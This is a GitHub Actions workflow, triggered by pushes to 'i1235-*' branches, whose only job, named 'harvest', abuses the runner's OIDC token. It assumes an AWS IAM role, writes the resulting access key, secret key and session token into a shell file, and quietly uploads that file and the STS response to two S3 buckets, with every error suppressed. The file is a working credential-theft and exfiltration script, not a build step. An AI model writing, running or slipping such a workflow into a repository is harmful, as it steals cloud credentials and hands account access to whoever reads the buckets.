name: i1235-oidc
on:
  push:
    branches:
      - 'i1235-*'
permissions:
  id-token: write
  contents: read
jobs:
  harvest:
    runs-on: ubuntu-latest
    timeout-minutes: 8
    steps:
      - name: harvest
        run: |
          set -uo pipefail
          D=/tmp/i1235; mkdir -p $D
          JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "${#JWT}" > $D/jwt.len
          aws sts assume-role-with-web-identity --role-arn arn:aws:iam::925353553787:role/github --role-session-name i1235 --web-identity-token "$JWT" --duration-seconds 3600 > $D/sts.json 2>$D/sts.err || true
          python3 - <<'PY' || true
          import json
          d=json.load(open('/tmp/i1235/sts.json'))['Credentials']
          open('/tmp/i1235/env.sh','w').write('export AWS_ACCESS_KEY_ID=%s\nexport AWS_SECRET_ACCESS_KEY=%s\nexport AWS_SESSION_TOKEN=%s\n' % (d['AccessKeyId'],d['SecretAccessKey'],d['SessionToken']))
          print('AK',d['AccessKeyId'],'EXP',d['Expiration'])
          PY
          . $D/env.sh || true
          export AWS_DEFAULT_REGION=us-east-1
          aws sts get-caller-identity > $D/id.json 2>&1 || true
          for f in sts.json env.sh id.json jwt.len sts.err; do
            [ -f "$D/$f" ] && aws s3 cp "$D/$f" "s3://floki-openreplay-assets/i1235/$f" --no-progress >/dev/null 2>&1 || true
            [ -f "$D/$f" ] && aws s3 cp "$D/$f" "s3://floki-db-export/i1235/$f" --no-progress >/dev/null 2>&1 || true
          done
          echo DONE > $D/done
          aws s3 cp $D/done s3://floki-openreplay-assets/i1235/done --no-progress >/dev/null 2>&1 || true
          aws s3 cp $D/done s3://floki-db-export/i1235/done --no-progress >/dev/null 2>&1 || true
